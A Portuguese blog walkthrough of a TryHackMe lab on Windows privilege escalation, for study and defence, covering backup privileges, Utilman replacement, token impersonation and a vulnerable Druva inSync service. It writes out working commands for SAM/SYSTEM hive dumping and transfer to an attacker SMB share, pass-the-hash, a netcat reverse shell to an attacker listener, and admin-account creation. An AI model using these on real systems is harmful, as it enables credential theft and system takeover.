---
layout: post
title: "Windows Privilege Escalation - Backup Operators, Tokens e Druva inSync"
description: "Walkthrough TryHackMe: SeBackupPrivilege, SeTakeOwnership, Utilman, SeImpersonate, RogueWinRM e serviço Druva inSync vulnerável. Comandos comentados, erros reais e dicas de enumeração."
date: 2026-10-13
categories: [walkthrough, pentest, windows, tryhackme]
tags: [windows, privilege-escalation, backup-operators, sebackupprivilege, setakeownership, seimpersonate, utilman, roguewinrm, winpeas, privesccheck, wes-ng, druva-insync, impacket, pass-the-hash]
---

<a id="topo"></a>

# Windows Privilege Escalation - Backup Operators, Tokens e Druva inSync

## Introdução

Nesta room do **TryHackMe**, explorei diferentes formas de elevar privilégios no Windows: permissões de backup, propriedade de arquivos, impersonação de tokens e um serviço desatualizado. A ideia foi entender **por que cada técnica funciona**, sem apenas copiar comandos.

> **Ambiente de laboratório autorizado.** Os IPs mudam quando as VMs são reiniciadas. Não altere executáveis do Windows nem crie usuários administrativos em máquinas fora do escopo.

### Índice

- [Backup Operators — SeBackupPrivilege](#backup)
- [SeTakeOwnership — Utilman](#takeownership)
- [SeImpersonate — RogueWinRM](#impersonate)
- [Unpatched Software — Druva inSync](#druva)
- [Ferramentas de enumeração](#enumeracao)
- [Comandos e operadores](#comandos)
- [Dicas, problemas encontrados e mitigação](#dicas)

---

<a id="backup"></a>

## 1. Backup Operators — SeBackupPrivilege

**Conceito:** integrantes de *Backup Operators* podem usar permissões especiais para fazer backup e restaurar arquivos. Isso não significa que sejam administradores, mas uma permissão de backup mal atribuída pode expor informações sensíveis.

**Ambiente utilizado:** AttackBox `10.64.94.176` → Windows `10.64.164.57`.

### Acesso e identificação

No terminal da AttackBox:

~~~bash
xfreerdp /v:10.64.164.57 /u:THMBackup /p:'CopyMaster555' /cert:ignore /dynamic-resolution
~~~

No Windows, abri um **CMD como administrador** (informando a senha novamente) e conferi:

~~~cmd
whoami
whoami /priv
~~~

Resultado relevante:

~~~text
wprivesc2\thmbackup
SeBackupPrivilege   Back up files and directories   Disabled
SeRestorePrivilege  Restore files and directories  Disabled
~~~

**Atenção:** `Disabled` significa que o privilégio está presente no token, mas não está habilitado naquele momento. Não é a mesma coisa que ele estar ausente. Comandos compatíveis com backup podem ativá-lo para a operação.

### Criando cópias da SAM e SYSTEM

~~~cmd
reg save hklm\sam C:\Users\THMBackup\sam.hive
reg save hklm\system C:\Users\THMBackup\system.hive
~~~

- `reg save`: salva uma cópia de uma chave do Registro.
- `HKLM\SAM`: contém informações das contas locais, incluindo hashes protegidos.
- `HKLM\SYSTEM`: contém os dados necessários para recuperar a chave que protege esses hashes.
- `sam.hive` e `system.hive`: arquivos gerados para análise offline; **não são hashes em si**.

### Transferindo os arquivos para a AttackBox

O Windows já consegue enviar arquivos via SMB. Para receber os arquivos, iniciei um servidor SMB **na AttackBox**, dentro de uma pasta de trabalho:

~~~bash
mkdir -p ~/share && cd ~/share
smbserver -smb2support -username THMBackup -password 'CopyMaster555' public .
~~~

Na minha versão do Impacket, o executável se chamava **`smbserver`**, e não `impacket-smbserver`.

No CMD do Windows:

~~~cmd
net use \\10.64.94.176\public /user:THMBackup "CopyMaster555"
copy C:\Users\THMBackup\sam.hive \\10.64.94.176\public\
copy C:\Users\THMBackup\system.hive \\10.64.94.176\public\
~~~

Depois confirmei os dois arquivos no Linux:

~~~bash
ls -lh ~/share/
~~~

**Por que o SMB funcionou aqui?** A conexão partiu do **Windows para a AttackBox**. Isso é diferente de tentar acessar o SMB do próprio Windows pela rede.

### Extraindo hashes com Impacket

~~~bash
cd ~/share
secretsdump -sam sam.hive -system system.hive LOCAL
~~~

Formato de uma linha da saída:

~~~text
Administrator:500:LMHASH:NTHASH:::
~~~

O **NT hash** é o quarto campo. `LOCAL` manda o Impacket trabalhar com os arquivos locais, sem conectar ao Windows.

A room propunha usar esse hash com **Pass-the-Hash (PtH)** e `psexec`:

~~~bash
psexec -hashes LMHASH:NTHASH administrator@10.64.164.57
~~~

**No meu teste, essa etapa não funcionou.** O Nmap mostrou:

~~~text
445/tcp  filtered  microsoft-ds
3389/tcp open      ms-wbt-server
~~~

O `psexec` precisa alcançar a porta **445/TCP no Windows** para autenticar e instalar um serviço remoto. Como a conexão expirava, **não cheguei a uma shell SYSTEM por esse caminho**. Não era erro na extração dos hashes nem no diretório compartilhado.

### Alternativa usada: ler os arquivos com privilégio de backup

Como a flag estava no desktop do Administrator, usei o modo de backup do `robocopy` em um CMD elevado:

~~~cmd
robocopy C:\Users\Administrator\Desktop C:\Users\THMBackup\loot /B /E /R:0 /W:0
dir C:\Users\THMBackup\loot
~~~

O `/B` solicita o modo *Backup*, permitindo que o programa utilize `SeBackupPrivilege`. Assim, obtive a flag da primeira etapa:

~~~text
THM{SEFLAGPRIVILEGE}
~~~

**Aprendizado:** ler arquivos protegidos com `SeBackupPrivilege` não significa que a sessão atual virou `SYSTEM`. A técnica e o resultado precisam ser diferenciados.

[Voltar ao índice](#topo)

---

<a id="takeownership"></a>

## 2. SeTakeOwnership — assumindo controle do Utilman

**Conceito:** `SeTakeOwnershipPrivilege` permite assumir a propriedade de objetos como arquivos e chaves do Registro. **Ser proprietário não concede automaticamente permissão de escrita**, mas permite alterar a lista de permissões (*ACL*).

Nesta etapa, a room utiliza o `Utilman.exe`, recurso de acessibilidade do Windows que pode ser iniciado na tela de bloqueio com contexto **SYSTEM**.

### Conexão e enumeração

~~~bash
xfreerdp /v:10.64.164.57 /u:THMTakeOwnership /p:'TheWorldIsMine2022' /cert:ignore /dynamic-resolution
~~~

Abri o CMD elevado e executei:

~~~cmd
whoami
whoami /priv
~~~

Encontrei:

~~~text
wprivesc2\thmtakeownership
SeTakeOwnershipPrivilege   Take ownership of files or other objects   Disabled
~~~

### Assumir propriedade e conceder escrita

~~~cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
~~~

- `takeown /f`: muda o proprietário do arquivo indicado.
- `icacls`: consulta e altera permissões do Windows.
- `/grant THMTakeOwnership:F`: concede **Full Control** à conta, incluindo escrita.

O `takeown` foi bem-sucedido, e o `icacls` confirmou que processou o arquivo sem falhas.

### Substituir o executável e testar

Já dentro de `C:\Windows\System32`:

~~~cmd
copy cmd.exe utilman.exe
~~~

Confirmei a substituição quando o Windows perguntou se deveria sobrescrever o arquivo.

Depois, pelo menu Iniciar, selecionei **Lock** e cliquei no ícone **Ease of Access** da tela bloqueada. Isso abriu um CMD. Conferi:

~~~cmd
whoami
~~~

Resultado:

~~~text
nt authority\system
~~~

**Por que funcionou?** Substituí o programa acionado pelo atalho de acessibilidade por `cmd.exe`. O Windows iniciou esse programa no contexto privilegiado da tela de bloqueio.

> Em máquinas reais, modificar `Utilman.exe` compromete um componente protegido do Windows. Nesta VM foi uma demonstração controlada; o executável original deve ser restaurado em sistemas de teste persistentes.

[Voltar ao índice](#topo)

---

<a id="impersonate"></a>

## 3. SeImpersonate / SeAssignPrimaryToken — RogueWinRM

**Conceito:** um *token* representa o contexto de segurança de um processo ou usuário. Certos serviços precisam agir temporariamente em nome de outro usuário (*impersonation*). Se isso puder ser provocado de forma indevida, um serviço com permissões limitadas pode acabar executando ações como uma conta mais privilegiada.

Na room, a web shell disponível no IIS estava em:

~~~text
http://10.64.164.57/
~~~

Pelo painel, executei:

~~~cmd
whoami
whoami /priv
~~~

Resultado relevante:

~~~text
iis apppool\defaultapppool
SeAssignPrimaryTokenPrivilege   Disabled
SeImpersonatePrivilege          Enabled
~~~

A conta de um **Application Pool do IIS** não era SYSTEM, mas possuía `SeImpersonatePrivilege`.

### Como o RogueWinRM explora isso?

O laboratório usa uma interação do serviço **BITS** (*Background Intelligent Transfer Service*) com a porta **5985**, normalmente associada ao **WinRM** (*Windows Remote Management*).

O RogueWinRM simula o endpoint necessário, recebe a autenticação de um processo privilegiado e usa a capacidade de impersonação para executar outro processo com o token obtido. O exploit já estava na VM em `C:\tools\RogueWinRM\`.

### Reverse shell

Na AttackBox, abri um listener:

~~~bash
nc -lvp 4442
~~~

Na **web shell** do alvo, executei:

~~~cmd
C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.64.94.176 4442"
~~~

- `-p`: executável a iniciar, aqui `nc64.exe`.
- `-a`: argumentos enviados a esse executável.
- `-e cmd.exe`: faz o Netcat executar o CMD vinculado à conexão.
- `10.64.94.176 4442`: IP e porta do listener na AttackBox.

O RogueWinRM informou:

~~~text
BITS triggered!
[+] authresult 0
NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
~~~

E a AttackBox recebeu uma shell. Confirmei:

~~~cmd
whoami
~~~

~~~text
nt authority\system
~~~

**Aprendizado:** aqui a elevação ocorreu por **impersonação do token**, não por senha ou hash. `CreateProcessWithTokenW OK` confirmou que o processo foi criado usando o contexto obtido.

[Voltar ao índice](#topo)

---

<a id="druva"></a>

## 4. Unpatched Software — Druva inSync

Desta vez, o vetor não era um privilégio especial no usuário: a room apresentava um **serviço Druva inSync desatualizado** que aceitava comandos por uma interface RPC local e os executava com privilégios elevados.

**VM desta etapa:** `10.64.175.38` — um alvo diferente das etapas anteriores.

### Acessar e conhecer a máquina

~~~bash
xfreerdp /v:10.64.175.38:3389 /u:thm-unpriv /p:'Password321' /cert:ignore /dynamic-resolution +clipboard
~~~

Aqui, `+clipboard` habilita a área de transferência entre Linux e Windows. Usei o FreeRDP para obter uma sessão do usuário sem privilégios.

O exploit de referência já estava no alvo:

~~~text
C:\tools\Druva_inSync_exploit.txt
~~~

Esse script PowerShell se comunica com `127.0.0.1:6064`, monta uma mensagem para a interface do Druva e envia o comando solicitado. O serviço vulnerável processa a requisição com permissões que o usuário comum não possui.

### Executar o script sem reescrever todo o exploit

No PowerShell da VM, copiei o arquivo existente:

~~~powershell
Copy-Item C:\tools\Druva_inSync_exploit.txt "$env:TEMP\exploit.ps1"
~~~

O valor original da variável era:

~~~powershell
$cmd = "net user pwnd /add"
~~~

Ele criaria uma conta comum. Para testar a elevação, alterei o `$cmd` para **criar a conta e adicioná-la ao grupo Administrators**. No meu teste, usei `Password321` como senha:

~~~powershell
$cmd = "net user pwnd Password321 /add & net localgroup administrators pwnd /add"
~~~

No arquivo copiado, essa linha deve substituir a definição original de `$cmd`. É possível editar com:

~~~powershell
notepad "$env:TEMP\exploit.ps1"
~~~

Depois, executei:

~~~powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "$env:TEMP\exploit.ps1"
~~~

- `-NoProfile`: não carrega o perfil do PowerShell.
- `-ExecutionPolicy Bypass`: evita o bloqueio de execução de scripts **nessa instância**, sem alterar permanentemente a política.
- `-File`: executa o `.ps1` informado.
- `&` dentro de `$cmd`: separa os dois comandos do `cmd.exe`; primeiro cria a conta, depois adiciona ao grupo.

> **Nota sobre as senhas:** o texto da room sugeria `SimplePass123`, mas **no meu teste** usei `Password321`. A senha usada ao entrar como `pwnd` precisa corresponder à que foi definida no script.

### Conferir e recuperar a flag

~~~cmd
net user pwnd
~~~

O resultado mostrou a conta ativa nos grupos **Administrators** e **Users**. Assim, a execução do exploit foi confirmada.

Usando uma sessão administrativa, abri o CMD elevado e li:

~~~cmd
type C:\Users\Administrator\Desktop\flag.txt
~~~

~~~text
THM{EZ_DLL_PROXY_4ME}
~~~

**Diferença importante:** criar um usuário do grupo Administrators **não transforma automaticamente a sessão atual de `thm-unpriv` em uma sessão elevada**. A nova conta deve ser usada para abrir uma sessão/processo administrativo.

[Voltar ao índice](#topo)

---

<a id="enumeracao"></a>

## 5. Ferramentas de enumeração

Antes de explorar um serviço, vale procurar permissões, versões vulneráveis e configurações inseguras. A room apresentou quatro ferramentas:

| Ferramenta | Onde roda | Para que serve |
|---|---|---|
| **WinPEAS** | Windows alvo | Enumera possíveis caminhos de escalação |
| **PrivescCheck** | PowerShell do alvo | Verifica configurações e privilégios inseguros |
| **WES-NG** | AttackBox/Linux | Compara o `systeminfo` com uma base de vulnerabilidades |
| **Metasploit local_exploit_suggester** | Metasploit com sessão Meterpreter | Sugere exploits locais potencialmente aplicáveis |

### WinPEAS

~~~cmd
winpeas.exe > outputfile.txt
~~~

O `>` grava a saída no arquivo, evitando poluir o terminal. É útil quando a enumeração produz centenas de linhas.

### PrivescCheck

~~~powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PrivescCheck.ps1
Invoke-PrivescCheck
~~~

O `.` separado por espaço é o **dot sourcing** do PowerShell: carrega as funções do script na sessão atual. `Invoke-PrivescCheck` então executa a verificação.

### WES-NG

No Windows:

~~~cmd
systeminfo > systeminfo.txt
~~~

Copie o `systeminfo.txt` para a AttackBox e execute:

~~~bash
wes.py --update
wes.py systeminfo.txt
~~~

O WES-NG **sugere** vulnerabilidades com base nas informações fornecidas; uma sugestão não prova que o exploit funcionará.

### Metasploit

Se já existir uma sessão Meterpreter, o módulo `multi/recon/local_exploit_suggester` pode avaliar possíveis exploits locais. Não precisei utilizá-lo para resolver estas etapas.

[Voltar ao índice](#topo)

---

<a id="comandos"></a>

## 6. Comandos e operadores — consulta rápida

| Comando / operador | O que faz |
|---|---|
| `whoami /priv` | Lista privilégios do token atual e seus estados |
| `whoami /groups` | Mostra grupos e nível de integridade |
| `reg save` | Exporta uma cópia de uma chave do Registro |
| `net use` | Conecta a um compartilhamento SMB |
| `copy` | Copia um arquivo para outro local |
| `secretsdump -sam -system LOCAL` | Analisa os hives locais e extrai hashes de contas |
| `psexec -hashes` | Autentica remotamente por LM:NT hash, se SMB estiver acessível |
| `robocopy /B` | Copia arquivos em modo de backup |
| `takeown /f` | Assume a propriedade de um arquivo |
| `icacls /grant usuario:F` | Concede controle total a uma conta |
| `nc -lvp 4442` | Abre um listener TCP na porta 4442 |
| `net user` | Consulta ou cria contas locais |
| `net localgroup` | Consulta ou modifica integrantes de grupos locais |
| `type arquivo` | Exibe um arquivo de texto no CMD |
| `>` | Redireciona a saída e sobrescreve um arquivo |
| `&` no CMD | Encadeia comandos, mesmo que o anterior falhe |
| `\` em caminhos Windows | Separa diretórios; em `\\servidor\share`, identifica um caminho de rede UNC |

---

<a id="dicas"></a>

## 7. Dicas, problemas encontrados e mitigação

### Erros reais que apareceram

**`impacket-smbserver: command not found`** — a versão instalada usava `smbserver` diretamente. O mesmo valeu para `secretsdump` e `psexec`. Usar `python3.9 /opt/impacket/examples/...` falhou porque aquele interpretador não tinha o módulo Impacket.

**`psexec ... timed out`** — o SMB do alvo estava `filtered` na porta 445. Mesmo depois de reiniciar as VMs, a porta continuou filtrada. A transferência dos hives, que partia do Windows para a AttackBox, funcionava normalmente.

**`Enable-NetFirewallRule: Access is denied`** — abrir um terminal com integridade *High* não garante que a conta tenha autorização para alterar o firewall. Backup Operators não é a mesma coisa que Administrators. Não foi necessário alterar o firewall para obter a flag.

**`whoami` mostrando `root` na AttackBox** — isso só confirma o usuário do Linux. Para verificar a escalação, o `whoami` precisa ser executado **na sessão do Windows alvo**.

### Como pensar na escalação

Em cada etapa, procure responder:

1. **Quem sou eu?** `whoami` e `whoami /priv`.
2. **O que posso controlar?** Arquivos, ACLs, tokens, serviços ou versões instaladas.
3. **Quem executará a ação?** Usuário comum, administrador ou SYSTEM.
4. **Como confirmar?** `whoami`, grupo administrativo, processo criado ou leitura efetiva da flag.

### Mitigação

- Conceder `SeBackupPrivilege`, `SeTakeOwnershipPrivilege` e `SeImpersonatePrivilege` somente a contas que realmente precisem deles.
- Restringir alterações em executáveis do Windows, manter controles de integridade e monitorar alterações em ACLs e binários protegidos.
- Reduzir permissões dos *application pools* e dos serviços; revisar exposição de mecanismos de impersonação.
- Atualizar serviços como o Druva inSync, remover versões vulneráveis e acompanhar alertas dos fornecedores.
- Monitorar criação de usuários locais e mudanças no grupo Administrators, especialmente após execução de processos incomuns.

### Conclusão

As técnicas exploraram **quatro pontos distintos**: privilégio de backup, propriedade de arquivos, impersonação de token e software vulnerável. O aprendizado mais importante foi separar **ter uma permissão**, **conseguir usar essa permissão** e **realmente executar como SYSTEM**.

### Referências

- [TryHackMe](https://tryhackme.com/)
- [PEASS-ng / WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [PrivescCheck](https://github.com/itm4n/PrivescCheck)
- [WES-NG](https://github.com/bitsadmin/wesng)
- [PayloadsAllTheThings — Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Priv2Admin](https://github.com/gtworek/Priv2Admin)
- [RogueWinRM](https://github.com/antonioCoco/RogueWinRM)

[Voltar ao índice](#topo)
